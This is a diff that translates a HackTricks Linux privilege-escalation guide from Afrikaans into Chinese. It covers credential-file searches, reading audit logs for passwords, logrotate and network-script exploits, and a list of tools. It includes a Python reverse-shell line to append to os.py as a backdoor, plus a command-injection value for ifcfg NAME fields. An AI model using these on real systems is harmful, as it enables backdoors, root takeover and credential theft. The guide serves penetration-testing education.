+### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
 ```bash
 find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
 ```
-### Versteekte lêers
+### 隐藏文件
 ```bash
 find / -type f -iname ".*" -ls 2>/dev/null
 ```
-### **Script/Binaries in PATH**
+### **脚本/二进制文件在 PATH 中**
 ```bash
 for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
 for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
 ```
-### **Web lêers**
+### **网页文件**
 ```bash
 ls -alhR /var/www/ 2>/dev/null
 ls -alhR /srv/www/htdocs/ 2>/dev/null
 ls -alhR /usr/local/www/apache22/data/
 ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 ```
-### **Rugsteun**
+### **备份**
 ```bash
 find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
 ```
-### Bekende lêers wat wagwoorde bevat
+### 已知包含密码的文件
 
-Lees die kode van [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), dit soek na **verskeie moontlike lêers wat wagwoorde kan bevat**.\
-**Nog 'n interessante hulpmiddel** wat jy kan gebruik om dit te doen is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) wat 'n oopbron-toepassing is wat gebruik word om baie wagwoorde wat op 'n plaaslike rekenaar gestoor is vir Windows, Linux & Mac te onttrek.
+阅读[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)的代码，它会搜索**可能包含密码的多个文件**。\
+**另一个有趣的工具**是：[**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用程序，用于检索存储在本地计算机上的大量密码，适用于Windows、Linux和Mac。
 
-### Logs
+### 日志
 
-As jy logs kan lees, mag jy in staat wees om **interessante/vertroulike inligting daarin te vind**. Hoe meer vreemd die log is, hoe meer interessant sal dit wees (waarskynlik).\
-Ook kan sommige "**slegte**" geconfigureerde (backdoored?) **auditslogs** jou toelaat om **wagwoorde** binne auditslogs te **registreer** soos verduidelik in hierdie pos: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
+如果您可以读取日志，您可能会在其中找到**有趣/机密的信息**。日志越奇怪，可能就越有趣。\
+此外，一些“**不良**”配置（后门？）的**审计日志**可能允许您**在审计日志中记录密码**，正如在这篇文章中所解释的：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
 ```bash
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
 ```
-Om **logs te lees, sal die groep** [**adm**](interesting-groups-linux-pe/#adm-group) baie nuttig wees.
+为了**读取日志，组** [**adm**](interesting-groups-linux-pe/#adm-group) 将非常有用。
 
-### Shell-lêers
+### Shell 文件
 ```bash
 ~/.bash_profile # if it exists, read it once when you log in to the shell
 ~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
@@ -1325,68 +1327,68 @@ Om **logs te lees, sal die groep** [**adm**](interesting-groups-linux-pe/#adm-gr
 ~/.zlogin #zsh shell
 ~/.zshrc #zsh shell
 ```
-### Generiese Kredensiële Soektog/Regex
+### 通用凭据搜索/正则表达式
 
-Jy moet ook kyk vir lêers wat die woord "**password**" in sy **naam** of binne die **inhoud** bevat, en ook kyk vir IP's en e-posse binne logs, of hashes regexps.\
-Ek gaan nie hier lys hoe om al hierdie te doen nie, maar as jy belangstel kan jy die laaste toetse wat [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) uitvoer, nagaan.
+您还应该检查文件名中或内容中包含“**password**”一词的文件，并检查日志中的IP和电子邮件，或哈希正则表达式。\
+我不会在这里列出如何做到这一切，但如果您感兴趣，可以查看[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)执行的最后检查。
 
-## Skryfbare lêers
+## 可写文件
 
-### Python biblioteek kaping
+### Python库劫持
 
-As jy weet **waar** 'n python skrip gaan uitgevoer word en jy **kan skryf binne** daardie gids of jy kan **python biblioteke wysig**, kan jy die OS biblioteek wysig en dit backdoor (as jy kan skryf waar die python skrip gaan uitgevoer word, kopieer en plak die os.py biblioteek).
+如果您知道**从哪里**将要执行python脚本，并且您**可以在**该文件夹中写入或**可以修改python库**，您可以修改OS库并进行后门（如果您可以写入python脚本将要执行的位置，请复制并粘贴os.py库）。
 
-Om die **biblioteek te backdoor**, voeg net die volgende lyn aan die einde van die os.py biblioteek by (verander IP en PORT):
+要**对库进行后门**，只需在os.py库的末尾添加以下行（更改IP和端口）：
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
-### Logrotate uitbuiting
+### Logrotate 利用
 
-'n Kwetsbaarheid in `logrotate` laat gebruikers met **skrywe toestemmings** op 'n loglêer of sy ouer directories potensieel verhoogde bevoegdhede verkry. Dit is omdat `logrotate`, wat dikwels as **root** loop, gemanipuleer kan word om arbitrêre lêers uit te voer, veral in directories soos _**/etc/bash\_completion.d/**_. Dit is belangrik om toestemmings te kontroleer nie net in _/var/log_ nie, maar ook in enige directory waar logrotasie toegepas word.
+`logrotate` 中的一个漏洞允许对日志文件或其父目录具有 **写权限** 的用户潜在地获得提升的权限。这是因为 `logrotate` 通常以 **root** 身份运行，可以被操控以执行任意文件，特别是在像 _**/etc/bash\_completion.d/**_ 这样的目录中。检查权限时，不仅要在 _/var/log_ 中检查，还要在应用日志轮换的任何目录中检查。
 
 {% hint style="info" %}
-Hierdie kwesbaarheid raak `logrotate` weergawe `3.18.0` en ouer
+此漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本
 {% endhint %}
 
-Meer gedetailleerde inligting oor die kwesbaarheid kan op hierdie bladsy gevind word: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).
+有关该漏洞的更多详细信息，请访问此页面：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。
 
-Jy kan hierdie kwesbaarheid uitbuit met [**logrotten**](https://github.com/whotwagner/logrotten).
+您可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 利用此漏洞。
 
-Hierdie kwesbaarheid is baie soortgelyk aan [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** so wanneer jy vind dat jy logs kan verander, kyk wie daardie logs bestuur en kyk of jy bevoegdhede kan verhoog deur die logs met symlinks te vervang.
+此漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **（nginx 日志）** 非常相似，因此每当您发现可以更改日志时，请检查谁在管理这些日志，并检查是否可以通过符号链接提升权限。
 
 ### /etc/sysconfig/network-scripts/ (Centos/Redhat)
 
-**Kwetsbaarheid verwysing:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
+**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
-As 'n gebruiker om enige rede in staat is om **te skryf** 'n `ifcf-<whatever>` skrip na _/etc/sysconfig/network-scripts_ **of** dit kan **aanpas** 'n bestaande een, dan is jou **stelsel pwned**.
+如果出于某种原因，用户能够 **写入** 一个 `ifcf-<whatever>` 脚本到 _/etc/sysconfig/network-scripts_ **或** 能够 **调整** 一个现有的脚本，那么您的 **系统已被攻陷**。
 
-Netwerk skripte, _ifcg-eth0_ byvoorbeeld, word gebruik vir netwerkverbindinge. Hulle lyk presies soos .INI lêers. Hulle word egter \~sourced\~ op Linux deur Network Manager (dispatcher.d).
+网络脚本，例如 _ifcg-eth0_ 用于网络连接。它们看起来与 .INI 文件完全相同。然而，它们在 Linux 上由网络管理器（dispatcher.d）~sourced~。
 
-In my geval, die `NAME=` attribuut in hierdie netwerk skripte word nie korrek hanteer nie. As jy **wit/leë spasie in die naam het, probeer die stelsel om die deel na die wit/leë spasie uit te voer**. Dit beteken dat **alles na die eerste leë spasie as root uitgevoer word**.
+在我的案例中，这些网络脚本中的 `NAME=` 属性处理不当。如果您在名称中有 **空格**，系统会尝试执行空格后的部分。这意味着 **第一个空格后的所有内容都以 root 身份执行**。
 
-Byvoorbeeld: _/etc/sysconfig/network-scripts/ifcfg-1337_
+例如： _/etc/sysconfig/network-scripts/ifcfg-1337_
 ```bash
 NAME=Network /bin/id
 ONBOOT=yes
 DEVICE=eth0
 ```
-### **init, init.d, systemd, en rc.d**
+### **init, init.d, systemd 和 rc.d**
 
-Die gids `/etc/init.d` is die tuiste van **scripts** vir System V init (SysVinit), die **klassieke Linux diensbestuurstelsel**. Dit sluit scripts in om dienste te `begin`, `stop`, `herbegin`, en soms `herlaai`. Hierdie kan direk of deur simboliese skakels in `/etc/rc?.d/` uitgevoer word. 'n Alternatiewe pad in Redhat stelsels is `/etc/rc.d/init.d`.
+目录 `/etc/init.d` 是 **System V init (SysVinit)** 的 **脚本** 的家，**经典的 Linux 服务管理系统**。它包含用于 `启动`、`停止`、`重启`，有时 `重新加载` 服务的脚本。这些可以直接执行或通过在 `/etc/rc?.d/` 中找到的符号链接执行。在 Redhat 系统中，另一个路径是 `/etc/rc.d/init.d`。
 
-Aan die ander kant, `/etc/init` is geassosieer met **Upstart**, 'n nuwer **diensbestuur** wat deur Ubuntu bekendgestel is, wat konfigurasie lêers gebruik vir diensbestuur take. Ten spyte van die oorgang na Upstart, word SysVinit scripts steeds saam met Upstart konfigurasies gebruik weens 'n kompatibiliteitslaag in Upstart.
+另一方面，`/etc/init` 与 **Upstart** 相关，Upstart 是 Ubuntu 引入的较新 **服务管理**，使用配置文件进行服务管理任务。尽管已经过渡到 Upstart，但由于 Upstart 中的兼容层，SysVinit 脚本仍与 Upstart 配置一起使用。
 
-**systemd** verskyn as 'n moderne inisialisasie en diensbestuurder, wat gevorderde funksies bied soos on-demand daemon begin, automount bestuur, en stelsels staat snapshots. Dit organiseer lêers in `/usr/lib/systemd/` vir verspreidingspakkette en `/etc/systemd/system/` vir administrateur wysigings, wat die stelsels administrasie proses stroomlyn.
+**systemd** 作为现代初始化和服务管理器出现，提供了按需守护进程启动、自动挂载管理和系统状态快照等高级功能。它将文件组织到 `/usr/lib/systemd/` 用于分发包，和 `/etc/systemd/system/` 用于管理员修改，简化了系统管理过程。
 
-## Ander Trukies
+## 其他技巧
 
-### NFS Privilege escalasie
+### NFS 权限提升
 
 {% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
 [nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no_root_squash-misconfiguration-pe.md)
 {% endcontent-ref %}
 
-### Ontsnapping uit beperkte Skale
+### 从受限 Shell 中逃逸
 
 {% content-ref url="escaping-from-limited-bash.md" %}
 [escaping-from-limited-bash.md](escaping-from-limited-bash.md)
@@ -1398,31 +1400,31 @@ Aan die ander kant, `/etc/init` is geassosieer met **Upstart**, 'n nuwer **diens
 [cisco-vmanage.md](cisco-vmanage.md)
 {% endcontent-ref %}
 
-## Kernel Sekuriteit Beskermings
+## 内核安全保护
 
 * [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
 * [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)
 
-## Meer hulp
+## 更多帮助
 
-[Statiese impacket binaries](https://github.com/ropnop/impacket_static_binaries)
+[静态 impacket 二进制文件](https://github.com/ropnop/impacket_static_binaries)
 
-## Linux/Unix Privesc Gereedskap
+## Linux/Unix 权限提升工具
 
-### **Beste gereedskap om na Linux plaaslike privilege escalasie vektore te soek:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
+### **查找 Linux 本地权限提升向量的最佳工具:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
-**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t opsie)\
+**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t 选项)\
 **Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
-**Unix Privesc Kontrole:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
-**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
+**Unix 权限提升检查:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
+**Linux 权限检查器:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
-**Kernelpop:** Enumereer kernel kwesbaarhede in linux en MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
+**Kernelpop:** 枚举 Linux 和 MAC 中的内核漏洞 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
 **Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
 **Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
-**EvilAbigail (fisiese toegang):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
-**Versameling van meer scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
+**EvilAbigail (物理访问):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
+**更多脚本的汇编**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
 
-## Verwysings
+## 参考文献
 
 * [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
 * [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
@@ -1443,16 +1445,16 @@ Aan die ander kant, `/etc/init` is geassosieer met **Upstart**, 'n nuwer **diens
 * [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客攻击：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客攻击： <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
-* **Deel hacking trukies deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
